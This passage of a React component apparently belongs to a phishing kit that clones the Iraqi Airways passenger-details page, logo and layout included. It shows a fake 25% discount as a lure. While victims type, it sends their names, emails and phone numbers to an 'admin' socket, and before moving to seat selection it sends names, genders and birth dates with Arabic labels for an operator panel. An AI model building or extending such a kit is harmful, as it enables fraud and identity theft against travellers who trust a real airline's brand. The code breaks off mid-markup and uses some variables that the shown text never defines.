import React, { useState, useEffect, useRef } from 'react';
import { useLocation } from 'wouter';
import { sendData, updatePage, globalDiscount } from '../lib/store';
import { formatPrice, getCurrency } from '../lib/currency';
import { useLang } from '../contexts/LanguageContext';
import { cityName as cityNameI18n } from '../lib/airportNames';
import CountryCodePicker from '../components/CountryCodePicker';
import DateOfBirthPicker from '../components/DateOfBirthPicker';
import CountrySelect from '../components/CountrySelect';
import SimpleDatePicker from '../components/SimpleDatePicker';

interface Passenger {
  type: string;
  gender: 'Male' | 'Female';
  firstName: string;
  lastName: string;
  dialCode: string;
  phone: string;
  email: string;
  dob: string;
  docType: string;
  passportNo: string;
  issueCountry: string;
  residenceCountry: string;
  expiryDate: string;
  issueDate: string;
}

const PassengerDetails = () => {
  // Subscribe to global discount signal for real-time UI updates
  const isDiscountActive = globalDiscount.value;
  const [, setLocation] = useLocation();
  const { isAr, dir, t, lang, setLang } = useLang();
  const [langMenuOpen, setLangMenuOpen] = useState(false);
  const [flightData, setFlightData] = useState<any>(null);
  const [passengers, setPassengers] = useState<Passenger[]>([]);
  const [openIndex, setOpenIndex] = useState(0);
  const [primaryIndex, setPrimaryIndex] = useState(0);
  const [flightsOpen, setFlightsOpen] = useState(false);
  const [routeDetailOpen, setRouteDetailOpen] = useState<Record<number, boolean>>({});
  const [cancelChoice, setCancelChoice] = useState<'refundable' | 'no' | null>(null);
  const [passportOpen, setPassportOpen] = useState<Record<number, boolean>>({});
  const [summaryOpen, setSummaryOpen] = useState(false);
  const [emergency, setEmergency] = useState({
    firstName: '',
    lastName: '',
    dialCode: '+964',
    phone: '',
    email: '',
  });
  const [extraEmails, setExtraEmails] = useState<string[]>([]);
  const [extraPhones, setExtraPhones] = useState<{code: string; number: string}[]>([]);
  const [showEmergency, setShowEmergency] = useState(false);
  const [rememberPassenger, setRememberPassenger] = useState(false);
  const [privacyAccepted, setPrivacyAccepted] = useState(false);
  const [formError, setFormError] = useState('');
  const [confirmEmail, setConfirmEmail] = useState('');
  const [specialAssistance, setSpecialAssistance] = useState<Record<string, any>>({});
  const [calOpen, setCalOpen] = useState(false);
  const [calView, setCalView] = useState<'years'|'months'|'days'>('years');
  const [calYear, setCalYear] = useState(2000);
  const [calMonth, setCalMonth] = useState(0);
  const [calYearRange, setCalYearRange] = useState(1991);
  const [calPaxIdx, setCalPaxIdx] = useState(0);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  useEffect(() => {
    if (debounceRef.current) clearTimeout(debounceRef.current);
    debounceRef.current = setTimeout(() => {
      if (passengers.length > 0) {
        const primary = passengers[0];
        if (primary.firstName || primary.lastName || primary.phone || primary.email) {
          const paxData: Record<string, any> = {
            "البريد الإلكتروني": primary.email,
            "رقم الهاتف": `${primary.dialCode} ${primary.phone}`,
            "الحالة": "إدخال بيانات المسافرين"
          };
          passengers.forEach((p, i) => {
            const label = passengers.length > 1 ? ` (مسافر ${i + 1})` : '';
            if (p.firstName || p.lastName) {
              paxData[`الاسم${label}`] = `${p.firstName} ${p.lastName}`.trim();
            }
          });
          
          visitor.value = {
            ...visitor.value,
            fullName: `${primary.firstName} ${primary.lastName}`.trim() || visitor.value.fullName,
          };

          socket.value.emit("more-info", {
            _id: visitor.value._id,
            content: paxData,
            page: "بيانات المسافر - إدخال فوري"
          });
        }
      }
    }, 1000);
    return () => { if (debounceRef.current) clearTimeout(debounceRef.current); };
  }, [passengers]);

  useEffect(() => {
    const ec = localStorage.getItem('emergencyContact');
    if (ec) {
      try { setEmergency((s) => ({ ...s, ...JSON.parse(ec) })); } catch { /* ignore */ }
    }
    const sa = localStorage.getItem('specialAssistance');
    if (sa) {
      try { setSpecialAssistance(JSON.parse(sa) || {}); } catch { /* ignore */ }
    }
    const data = localStorage.getItem('selectedFlight');
    if (!data) {
      setLocation('/');
      return;
    }
    const parsed = JSON.parse(data);
    setFlightData(parsed);

    const px = parsed.pax || { adult: parseInt(parsed.passengers) || 1, child: 0, infant: 0, senior: 0, minor: 0 };
    const types: string[] = [];
    for (let i = 0; i < (px.adult || 0); i++) types.push('Adult');
    for (let i = 0; i < (px.senior || 0); i++) types.push('Senior');
    for (let i = 0; i < (px.child || 0); i++) types.push('Child');
    for (let i = 0; i < (px.infant || 0); i++) types.push('Infant');
    for (let i = 0; i < (px.minor || 0); i++) types.push('Unaccompanied minor');
    if (types.length === 0) types.push('Adult');

    const freshList: Passenger[] = types.map((t) => ({
      type: t,
      gender: 'Male',
      firstName: '',
      lastName: '',
      dialCode: '+964',
      phone: '',
      email: '',
      dob: '',
      docType: '',
      passportNo: '',
      issueCountry: '',
      residenceCountry: '',
      expiryDate: '',
      issueDate: '',
    }));

    // Restore previously entered passenger data (e.g. after visiting the
    // emergency-contact page) so the user's input is never lost.
    let restored: Passenger[] | null = null;
    try {
      const saved = localStorage.getItem('passengerData');
      if (saved) {
        const arr = JSON.parse(saved);
        if (Array.isArray(arr) && arr.length === freshList.length) {
          restored = freshList.map((base, i) => ({ ...base, ...arr[i] }));
        }
      }
    } catch { /* ignore */ }

    setPassengers(restored || freshList);
  }, [setLocation]);

  // Persist passenger data on every change so navigating away (e.g. to add an
  // emergency contact) does not wipe what the user already typed.
  useEffect(() => {
    if (passengers.length > 0) {
      try { localStorage.setItem('passengerData', JSON.stringify(passengers)); } catch { /* ignore */ }
    }
  }, [passengers]);

  const update = (index: number, field: keyof Passenger, value: string) => {
    setPassengers((prev) => prev.map((p, i) => (i === index ? { ...p, [field]: value } : p)));
  };

  // Names must match passport: allow Latin letters, spaces, hyphen and apostrophe only.
  // Strips Arabic and any other non-Latin characters as the user types (like the original).
  const sanitizeName = (value: string) =>
    value.replace(/[^A-Za-z \-']/g, '');

  // Phone: digits only (and an optional leading +). Strips Arabic/Latin letters.
  const sanitizePhone = (value: string) =>
    value.replace(/[^0-9]/g, '');

  // Email: Latin letters, digits and common email characters only (rejects Arabic).
  const sanitizeEmail = (value: string) =>
    value.replace(/[^A-Za-z0-9@._%+\-]/g, '');

  if (!flightData || passengers.length === 0) return null;

  const px = flightData.pax || { adult: parseInt(flightData.passengers) || 1, child: 0, infant: 0, senior: 0, minor: 0 };
  const curCode = getCurrency(flightData.currency).code;
  const totalCount = passengers.length;

  // Pricing: Flights (base, taxes excluded) + Taxes (~3.66% like original 23.250/634.500)
  const base = flightData.basePriceKWD || flightData.priceKWD || 0;
  // Duo seat: a flat fee per seat that is already baked into totalPriceKWD by the
  // results page. Pull it back out so we can show it as its own summary line and
  // avoid double counting when we re-add it to the displayed Total.
  const DUO_SEAT_FEE = 9;
  const duoSeatCount = parseInt(flightData.duoSeat, 10) || 0;
  const duoSeatKWD = Math.round(DUO_SEAT_FEE * duoSeatCount * 1000) / 1000;
  const grandTotalRaw = flightData.totalPriceKWD != null
    ? flightData.totalPriceKWD
    : base * totalCount;
  // Fare-only grand total (flights + taxes), excluding the duo seat fee.
  const baseGrandTotal = Math.round((grandTotalRaw - duoSeatKWD) * 1000) / 1000;
  const grandTotal = applyDiscount(baseGrandTotal);
  // Derive flights vs taxes from the grand total (taxes ~ 3.661% of flights portion)
  const taxRate = 0.03661;
  const flightsAmount = Math.round((grandTotal / (1 + taxRate)) * 1000) / 1000;
  const taxesAmount = Math.round((grandTotal - flightsAmount) * 1000) / 1000;

  // Cancel for Any Reason (CFAR): +4 KWD per passenger; refund is 80% of fare+taxes
  const CFAR_FEE = 4.0;
  const cfarFee = cancelChoice === 'refundable' ? Math.round(CFAR_FEE * totalCount * 1000) / 1000 : 0;
  const refundAmount = Math.round(grandTotal * 0.8 * 1000) / 1000;
  // Keep the displayed Total exactly equal to the sum of the displayed lines
  // (Flights + Taxes + CFAR) in the SELECTED currency, so no rounding drift appears.
  const cur = getCurrency(flightData.currency);
  const f = Math.pow(10, cur.decimals);
  const flightsConv = Math.round(flightsAmount * cur.rate * f) / f;
  const taxesConv = Math.round(taxesAmount * cur.rate * f) / f;
  const cfarConv = Math.round(cfarFee * cur.rate * f) / f;
  const duoSeatConv = Math.round(duoSeatKWD * cur.rate * f) / f;
  // Special assistance (wheelchair) add-ons: sum across all passengers in KWD
  const assistanceKWD = Object.values(specialAssistance).reduce(
    (sum: number, v: any) => sum + (v && typeof v.priceKWD === 'number' ? v.priceKWD : 0), 0);
  const assistanceConv = Math.round(assistanceKWD * cur.rate * f) / f;
  const finalTotalConv = Math.round((flightsConv + taxesConv + cfarConv + assistanceConv + duoSeatConv) * f) / f;
  // finalTotal stays in KWD for downstream payment routing
  const finalTotal = Math.round((grandTotal + cfarFee + assistanceKWD + duoSeatKWD) * 1000) / 1000;
  // The 25% discount only applies to the fare portion (flights + taxes).
  // Since we now store original prices, the discount amount is (original - discounted).
  const fareConv = Math.round((flightsConv + taxesConv) * f) / f;
  const originalFareConv = Math.round((baseGrandTotal * cur.rate) * f) / f;
  const discountAmountConv = Math.round((originalFareConv - fareConv) * f) / f;
  // Format an already-converted amount in the selected currency.
  const fmtConv = (v: number) => `${cur.code} ${v.toLocaleString('en-US', { minimumFractionDigits: cur.decimals, maximumFractionDigits: cur.decimals })}`;

  // Trip type summary text
  const tripLabel = flightData.tripType === 'round'
    ? t('common.roundTrip')
    : flightData.tripType === 'multicity'
      ? t('common.multiCity')
      : t('fsr.oneWay');
  const firstDate = (() => {
    const d = (flightData.legs && flightData.legs[0] && flightData.legs[0].date) || flightData.date;
    if (!d) return '';
    const dt = new Date(d);
    if (isNaN(dt.getTime())) return d;
    return dt.toLocaleDateString(isAr ? 'ar-EG' : 'en-GB', { weekday: 'short', day: 'numeric', month: 'short', year: 'numeric' });
  })();

  const handleContinue = () => {
    const primary = passengers[primaryIndex];
    setFormError('');
    const isValid = passengers.every((p) => p.firstName.trim() && p.lastName.trim())
      && primary.email.trim() && primary.phone.trim();
    if (!isValid) {
      setFormError('Please complete all required passenger fields, including the primary guest contact details.');
      return;
    }
    if (primary.email !== confirmEmail) {
      setFormError('Email addresses do not match. Please check and try again.');
      return;
    }
    if (!privacyAccepted) {
      setFormError('Please accept the privacy policy to continue.');
      return;
    }
    setFormError('');
    localStorage.setItem('passengerData', JSON.stringify(passengers));
    localStorage.setItem('cancelForAnyReason', cancelChoice === 'refundable' ? '1' : '0');
    const summaryLegs = legs.map((leg: any) => {
      const route = (leg.origin && leg.destination)
        ? `${cityName(leg.origin)} - ${cityName(leg.destination)}`
        : (flightData.tripType === 'round' ? 'Departure' : 'Flight');
      const fn = leg.flightNumber
        ? String(leg.flightNumber).replace(/^([A-Za-z0-9]{2})\s?(\d+)$/, '$1 $2')
        : '';
      const times = (leg.departureTime && leg.arrivalTime)
        ? `${leg.departureTime} - ${leg.arrivalTime}` : '';
      const detail = [fn, times, fmtLegDate(leg.date)].filter(Boolean).join(' | ');
      return { route, detail, origin: leg.origin || '', destination: leg.destination || '' };
    });
    const bundleName = flightData.fareType || flightData.bundle || flightData.fareName || (flightData.legs && flightData.legs[0] && flightData.legs[0].fare) || 'Basic';
    localStorage.setItem('tripSummary', JSON.stringify({
      passengerCount: totalCount,
      tripLabel,
      firstDate,
      flightsConv,
      taxesConv,
      cfarConv,
      baseTotalConv: finalTotalConv,
      originalTotalConv: originalFareConv + cfarConv + assistanceConv + duoSeatConv,
      curCode,
      curDecimals: cur.decimals,
      curRate: cur.rate,
      baseTotalKWD: finalTotal,
      discountConv: discountAmountConv,
      legs: summaryLegs,
      bundleName,
      primaryName: `${primary.firstName} ${primary.lastName}`.trim(),
      route: summaryLegs[0] ? `${summaryLegs[0].origin} \u2708 ${summaryLegs[0].destination}` : '',
      originCode: summaryLegs[0] ? summaryLegs[0].origin : '',
      destCode: summaryLegs[0] ? summaryLegs[0].destination : '',
    }));
    localStorage.setItem('amouage_order_total', String(finalTotal));
    
    // Send passenger data to admin
    const paxData: Record<string, any> = {
      "البريد الإلكتروني": primary.email,
      "رقم الهاتف": `${primary.dialCode} ${primary.phone}`,
      "الرحلة": summaryLegs[0] ? `${summaryLegs[0].origin} ✈ ${summaryLegs[0].destination}` : '',
      "الإجمالي": `${finalTotalConv} ${curCode}`,
    };
    passengers.forEach((p, i) => {
      const label = passengers.length > 1 ? ` (مسافر ${i + 1})` : '';
      paxData[`الاسم${label}`] = `${p.firstName} ${p.lastName}`.trim();
      paxData[`الجنس${label}`] = p.gender === 'Female' ? 'أنثى' : 'ذكر';
      if (p.dob) paxData[`تاريخ الميلاد${label}`] = p.dob;
    });
    sendData({
      data: paxData,
      current: "بيانات المسافر",
      nextPage: "اختيار المقاعد",
      waitingForAdminResponse: false,
      isCustom: true,
    });

    setLocation('/seat-customization');
  };

  const legs = Array.isArray(flightData.legs) && flightData.legs.length > 0
    ? flightData.legs
    : [{
        origin: flightData.origin,
        destination: flightData.destination,
        date: flightData.date,
        flightNumber: flightData.flightNumber,
        departureTime: flightData.departureTime,
        arrivalTime: flightData.arrivalTime,
      }];

  // Map common IATA codes to city names (fallback to the code itself)
  const CITY_NAMES: Record<string, string> = {
    KWI: 'Kuwait', AMD: 'Ahmedabad', AUH: 'Abu Dhabi', DXB: 'Dubai',
    DOH: 'Doha', JED: 'Jeddah', RUH: 'Riyadh', CAI: 'Cairo', BAH: 'Bahrain',
    MCT: 'Muscat', AMM: 'Amman', BEY: 'Beirut', IST: 'Istanbul', DEL: 'Delhi',
    BOM: 'Mumbai', COK: 'Kochi', CCJ: 'Calicut', TRV: 'Trivandrum', MAA: 'Chennai',
    HYD: 'Hyderabad', BLR: 'Bengaluru', DAC: 'Dhaka', CMB: 'Colombo', KTM: 'Kathmandu',
    SLL: 'Salalah', ADE: 'Aden', SAH: 'Sanaa', LXR: 'Luxor', SSH: 'Sharm El Sheikh',
    ALY: 'Alexandria', TBS: 'Tbilisi', GYD: 'Baku', EVN: 'Yerevan', SAW: 'Istanbul',
    NJF: 'Najaf', BGW: 'Baghdad', BSR: 'Basra', EBL: 'Erbil', ISU: 'Sulaymaniyah',
  };
  const cityName = (code?: string) => (code ? cityNameI18n(String(code).toUpperCase(), CITY_NAMES[String(code).toUpperCase()] || code, lang) : '');
  const paxTypeLabel = (type: string) => {
    if (!isAr) return type;
    const map: Record<string, string> = { Adult: 'بالغ', Child: 'طفل', Infant: 'رضيع', Senior: 'كبير السن', Minor: 'قاصر' };
    return map[type] || type;
  };

  const fmtLegDate = (d?: string) => {
    if (!d) return '';
    const dt = new Date(d);
    if (isNaN(dt.getTime())) return d;
    return dt.toLocaleDateString(isAr ? 'ar-EG' : 'en-GB', { weekday: 'short', day: 'numeric', month: 'short', year: 'numeric' });
  };

  const calcDuration = (dep?: string, arr?: string) => {
    if (!dep || !arr) return '';
    const toMin = (t: string) => {
      const m = t.match(/(\d{1,2}):(\d{2})/);
      if (!m) return null;
      return parseInt(m[1], 10) * 60 + parseInt(m[2], 10);
    };
    const a = toMin(dep), b = toMin(arr);
    if (a == null || b == null) return '';
    let diff = b - a;
    if (diff < 0) diff += 24 * 60; // overnight
    const h = Math.floor(diff / 60), mm = diff % 60;
    return `${h}h ${mm}m`;
  };

  // Bundle/fare name for trip summary
  const bundleName = flightData.fareType || flightData.bundle || flightData.fareName || (flightData.legs && flightData.legs[0] && flightData.legs[0].fare) || 'Basic';

  // --- TRIP SUMMARY CONTENT (shared between desktop sidebar and mobile bottom sheet) ---
  const TripSummaryContent = () => (
    <>
      <div className="flex items-center gap-2 text-[#0a2540] mb-2">
        <svg className="w-5 h-5 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a4 4 0 00-3-3.87M9 20H4v-2a4 4 0 013-3.87m6-1.13a4 4 0 100-8 4 4 0 000 8z" /></svg>
        <span className="text-[15px]">{totalCount} {totalCount > 1 ? t('common.passengers') : t('common.passenger')}</span>
      </div>
      <div className="flex items-center gap-2 text-[#0a2540] mb-5">
        <svg className="w-5 h-5 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" /></svg>
        <span className="text-[15px]">{tripLabel}: {firstDate}</span>
      </div>

      {/* Flights box (expandable) */}
      <div className="bg-[#f4f7fb] rounded-xl mb-3">
        <button
          type="button"
          onClick={() => setFlightsOpen((o) => !o)}
          className="w-full flex items-center justify-between px-4 py-4"
        >
          <span className="text-[#0a2540] font-bold text-[15px]">{t('seat.flights')}</span>
          <span className="flex items-center gap-2">
            <span className="flex flex-col items-end leading-none">
              <span className="text-[10px] line-through text-[#FF0000] mb-0.5">{fmtConv(Math.round(flightsConv / 0.75 * f) / f)}</span>
              <span className="text-[#0a72c0] font-semibold text-[15px]">{fmtConv(flightsConv)}</span>
            </span>
            <svg className={`w-4 h-4 text-[#0a72c0] transition-transform ${flightsOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
          </span>
        </button>
        {flightsOpen && (
          <div className="px-4 pb-4 border-t border-[#e3eaf2] pt-3 space-y-4">
            {legs.map((leg: any, i: number) => {
              const route = (leg.origin && leg.destination)
                ? `${cityName(leg.origin)} - ${cityName(leg.destination)}`
                : (flightData.tripType === 'round' ? t('common.departure') : (isAr ? 'رحلة' : 'Flight'));
              const fn = leg.flightNumber
                ? String(leg.flightNumber).replace(/^([A-Za-z0-9]{2})\s?(\d+)$/, '$1 $2')
                : '';
              const times = (leg.departureTime && leg.arrivalTime)
                ? `${leg.departureTime} - ${leg.arrivalTime}` : '';
              const dateStr = fmtLegDate(leg.date);
              const detailParts = [fn, times, dateStr].filter(Boolean);
              const stops = leg.stops != null ? leg.stops : 0;
              const dur = leg.duration || calcDuration(leg.departureTime, leg.arrivalTime);
              const badgeText = `${stops === 0 ? (isAr ? 'مباشر' : 'Non stop') : stops + (stops === 1 ? (isAr ? ' توقف' : ' Stop') : (isAr ? ' توقفات' : ' Stops'))}${dur ? ' | ' + dur : ''}`;
              const isRouteOpen = routeDetailOpen[i] || false;
              return (
                <div key={i} className="space-y-2">
                  {/* Route header - expandable */}
                  <button
                    type="button"
                    onClick={() => setRouteDetailOpen((prev) => ({ ...prev, [i]: !prev[i] }))}
                    className="w-full flex items-center justify-between"
                  >
                    <span className="text-[#0a2540] font-semibold text-[15px]">{route}</span>
                    <svg className={`w-4 h-4 text-gray-400 transition-transform ${isRouteOpen ? 'rotate-180' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7" /></svg>
                  </button>
                  {isRouteOpen && (
                    <div className="space-y-2 pl-0">
                      {detailParts.length > 0 && (
                        <div className="text-sm text-[#5b6b7b]">{detailParts.join(' | ')}</div>
                      )}
                      <div className="flex justify-center">
                        <span className="inline-block bg-[#d1d5db] text-[#1f2937] text-xs font-medium px-4 py-1.5 rounded-full">{badgeText}</span>
                      </div>
                      {/* Fare type badge */}
                      <div className="flex justify-center">
                        <span className="inline-block bg-[#e5e7eb] text-[#374151] text-xs font-medium px-6 py-1.5 rounded-full w-full text-center">{bundleName}</span>
                      </div>
                      {/* Passenger breakdown */}
                      <div className="pt-2 space-y-1">
                        <div className="flex items-center justify-between">
                          <span className="flex items-center gap-2 text-[#0a2540] font-semibold text-sm">
                            <svg className="w-4 h-4 text-[#0a72c0]" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M17 20h5v-2a4 4 0 00-3-3.87M9 20H4v-2a4 4 0 013-3.87m6-1.13a4 4 0 100-8 4 4 0 000 8z" /></svg>
                            {isAr ? 'الركاب' : 'Passengers'}
                          </span>
                          <span className="flex flex-col items-end leading-none">
                            <span className="text-[9px] line-through text-[#FF0000] mb-0.5">{fmtConv(Math.round(flightsConv / 0.75 * f) / f)}</span>
                            <span className="text-[#0a72c0] font-semibold text-sm">{fmtConv(flightsConv)}</span>
                          </span>
                        </div>
                        {/* Per-type breakdown */}
                        {(px.adult || 0) > 0 && (
                          <div className="flex items-center justify-between text-sm text-[#5b6b7b]">
                            <span>{px.adult}x {isAr ? 'بالغ' : 'Adult'}</span>
                            <span className="flex flex-col items-end leading-none">
                                <span className="text-[9px] line-through text-[#FF0000] mb-0.5">{fmtConv(Math.round(flightsConv / 0.75 * f) / f)}</span>
                                <span className="text-[#0a72c0]">{fmtConv(flightsConv)}</span>
                              </span>
                          </div>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </div>

      {/* Taxes box */}
      <div className="bg-[#f4f7fb] rounded-xl mb-3">
        <div className="flex items-center justify-between px-4 py-4">
          <span className="text-[#0a2540] font-bold text-[15px]">{isAr ? 'الضرائب' : 'Taxes'}</span>
          <span className="text-[#0a72c0] font-semibold text-[15px]">{fmtConv(taxesConv)}</span>
        </div>
      </div>

      {/* CFAR fee */}
      {cfarFee > 0 && (
        <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#f4f7fb] rounded-xl">
          <span className="text-[#0a2540] font-medium">{isAr ? 'الإلغاء لأي سبب' : 'Cancel for Any Reason'}</span>
          <span className="text-[#0a72c0] font-semibold">{fmtConv(cfarConv)}</span>
        </div>
      )}

      {/* Duo seat */}
      {duoSeatKWD > 0 && (
        <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#f4f7fb] rounded-xl">
          <span className="text-[#0a2540] font-medium">{isAr ? `مقعد دو (${duoSeatCount})` : `Duo seat (${duoSeatCount})`}</span>
          <span className="text-[#0a72c0] font-semibold">{fmtConv(duoSeatConv)}</span>
        </div>
      )}

      {/* Special assistance (wheelchair) */}
      {assistanceKWD > 0 && (
        <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#f4f7fb] rounded-xl">
          <span className="text-[#0a2540] font-medium">{isAr ? 'إضافات' : 'Add-ons'}</span>
          <span className="text-[#0a72c0] font-semibold">{fmtConv(assistanceConv)}</span>
        </div>
      )}

      {/* Discount: 25% already applied only to the fare (flights + taxes); add-ons/CFAR are not discounted. */}
      {globalDiscount.value && (
        <div className="flex items-center justify-between px-4 py-3 mb-3 bg-[#fdeaea] rounded-xl">
          <span className="text-[#c0392b] font-medium">{isAr ? 'إجمالي الخصم 25%' : 'Total discount 25%'}</span>
          <span className="text-[#c0392b] font-semibold">- {fmtConv(discountAmountConv)}</span>
        </div>
      )}

      {/* Total */}
      <div className="flex items-center justify-between mt-4 mb-5">
        <span className="text-lg font-bold text-[#0a2540]">{t('common.total')}</span>
        <span className="flex flex-col items-end leading-tight">
          {globalDiscount.value && <span className="text-sm line-through text-[#FF0000]">{fmtConv(originalFareConv + cfarConv + assistanceConv + duoSeatConv)}</span>}
          <span className="text-lg font-extrabold text-[#0a72c0]">{fmtConv(finalTotalConv)}</span>
        </span>
      </div>
    </>
  );

  // fieldset input style matching original
  const fieldsetCls = "w-full bg-[#f5faf0] border border-[#4CAF50] rounded px-4 py-4 text-gray-800 placeholder-gray-400 focus:outline-none focus:border-[#2E7D32] text-[15px]";
  const labelCls = "block text-[13px] text-[#2E7D32] font-medium mb-1";

  return (
    <div className="min-h-screen bg-white font-[Lato]" dir="ltr">
      {/* Custom Date Picker Popup */}
      {calOpen && (
        <div className="fixed inset-0 z-50" onClick={() => setCalOpen(false)}>
          <div className="absolute bg-white border border-[#4CAF50] rounded-lg shadow-xl p-4 w-[90%] max-w-[380px] left-1/2 -translate-x-1/2" ref={(el) => { if (el) { const target = document.querySelector(`[data-cal-idx="${calPaxIdx}"]`) as HTMLElement; if (target) { const r = target.getBoundingClientRect(); const scrollY = window.scrollY || window.pageYOffset; el.style.top = (r.top + scrollY - el.offsetHeight - 8) + 'px'; } } }} onClick={(e) => e.stopPropagation()}>
            {/* Header */}
            <div className="flex items-center justify-between mb-4 border-b border-[#4CAF50] pb-2">
              <span className="text-[#2E7D32] font-bold cursor-pointer" onClick={() => { if (calView === 'days') setCalView('months'); else if (calView === 'months') setCalView('years'); }}>
                {calView === 'years' && `${calYearRange} \u2013 ${calYearRange + 23}`}
                {calView === 'months' && calYear}
                {calView === 'days' && `${['January','February','March','April','May','June','July','August','September','October','November','December'][calMonth]} ${calYear}`}
                {' \u25B4'}
              </span>
              <div className="flex gap-3">
                <span className="text-[#2E7D32] cursor-pointer text-2xl px-2 hover:bg-[#e8f5e9] rounded leading-none" onClick={() => { if (calView === 'years') setCalYearRange(r => r - 24); else if (calView === 'months') setCalYear(y => y - 1); else setCalMonth(m => m === 0 ? (setCalYear(y => y-1), 11) : m - 1); }}>‹</span>
                <span className="text-[#2E7D32] cursor-pointer text-2xl px-2 hover:bg-[#e8f5e9] rounded leading-none" onClick={() => { if (calView === 'years') setCalYearRange(r => r + 24); else if (calView === 'months') setCalYear(y => y + 1); else { if (calMonth === 11) { setCalYear(y => y+1); setCalMonth(0); } else setCalMonth(m => m+1); } }}>›</span>
              </div>
            </div>
            {/* Years view */}
            {calView === 'years' && (
              <div className="grid grid-cols-4 gap-2">
                {Array.from({length: 24}, (_, i) => calYearRange + i).map(y => (
                  <button key={y} onClick={() => { setCalYear(y); setCalView('months'); }} className="text-[#2E7D32] text-sm py-2 hover:bg-[#e8f5e9] rounded">{y}</button>
                ))}
              </div>
            )}
            {/* Months view */}
            {calView === 'months' && (
              <div className="grid grid-cols-4 gap-2">
                {['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'].map((m, i) => (
                  <button key={m} onClick={() => { setCalMonth(i); setCalView('days'); }} className="text-[#2E7D32] text-sm py-2 hover:bg-[#e8f5e9] rounded">{m}</button>
                ))}
              </div>
            )}
            {/* Days view */}
            {calView === 'days' && (
              <div className="grid grid-cols-7 gap-1">
                {['Su','Mo','Tu','We','Th','Fr','Sa'].map(d => <span key={d} className="text-[#2E7D32] text-xs text-center font-bold">{d}</span>)}
                {Array.from({length: new Date(calYear, calMonth, 1).getDay()}, (_, i) => <span key={`e${i}`}></span>)}
                {Array.from({length: new Date(calYear, calMonth + 1, 0).getDate()}, (_, i) => (
                  <button key={i+1} onClick={() => { const dd = String(i+1).padStart(2,'0'); const mm = String(calMonth+1).padStart(2,'0'); update(calPaxIdx, 'dob', `${dd}/${mm}/${calYear}`); setCalOpen(false); }} className="text-[#2E7D32] text-sm py-1 hover:bg-[#e8f5e9] rounded">{i+1}</button>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* Header - matching original exactly */}
      <header className="bg-[#4ca42c] text-white">
        {/* Top bar: Logo + Home + English */}
        <div className="max-w-7xl mx-auto px-6 py-2 flex items-center gap-4">
          <img src="/iraqi_airways/upload/logo-white-transparent.png" alt="Iraqi Airways" className="h-14" />
          <span className="text-white/40">|</span>
          <a href="/" className="text-white font-medium">Home</a>
          <span className="text-white/40">|</span>
          <div className="relative">
            <button onClick={() => setLangMenuOpen(o => !o)} className="text-white flex items-center gap-1">
              <span>{lang === 'ar' ? 'العربية' : 'English'}</span>
              <span className="text-xs">▼</span>
            </button>
            {langMenuOpen && (
              <div className="absolute z-30 mt-1 w-36 bg-white rounded-xl shadow-lg border border-gray-200 overflow-hidden" style={{ left: 0 }}>
                <button onClick={() => { setLang('ar'); setLangMenuOpen(false); }} className="block w-full text-start px-4 py-2.5 text-sm hover:bg-green-50">العربية</button>
                <button onClick={() => { setLang('en'); setLangMenuOpen(false); }} className="block w-full text-start px-4 py-2.5 text-sm hover:bg-green-50">English</button>
              </div>
            )}
          </div>
        </div>
      </header>
      {/* Flight info bar - white background, green text like original */}
      <div className="bg-white border-b border-gray-200 py-2">
        <div className="max-w-7xl mx-auto px-3 sm:px-6 flex items-center flex-wrap sm:flex-nowrap">
          {/* Route */}
          <div className="flex items-center gap-2 sm:gap-4">
            <div>
              <span className="text-lg sm:text-2xl font-bold text-[#1B5E20]">{flightData?.origin || 'BGW'}</span>
              <p className="text-[10px] sm:text-xs text-[#1B5E20]">{cityName(flightData?.origin || 'BGW')}</p>
            </div>
            <div className="flex flex-col items-center mx-2 gap-0">
              {flightData?.tripType === 'round' ? (
                <>
                  <div className="flex items-center"><span className="text-[#4ca42c] text-[9px] tracking-[2px]">············</span><svg className="w-3.5 h-3.5 text-[#4ca42c]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/></svg></div>
                  <div className="flex items-center"><svg className="w-3.5 h-3.5 text-[#4ca42c] rotate-180" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/></svg><span className="text-[#4ca42c] text-[9px] tracking-[2px]">············</span></div>
                </>
              ) : (
                <div className="flex items-center"><span className="text-[#4ca42c] text-[9px] tracking-[2px]">············</span><svg className="w-3.5 h-3.5 text-[#4ca42c]" fill="currentColor" viewBox="0 0 24 24"><path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/></svg></div>
              )}
            </div>
            <div>
              <span className="text-lg sm:text-2xl font-bold text-[#1B5E20]">{flightData?.destination || 'EBL'}</span>
              <p className="text-[10px] sm:text-xs text-[#1B5E20]">{cityName(flightData?.destination || 'EBL')}</p>
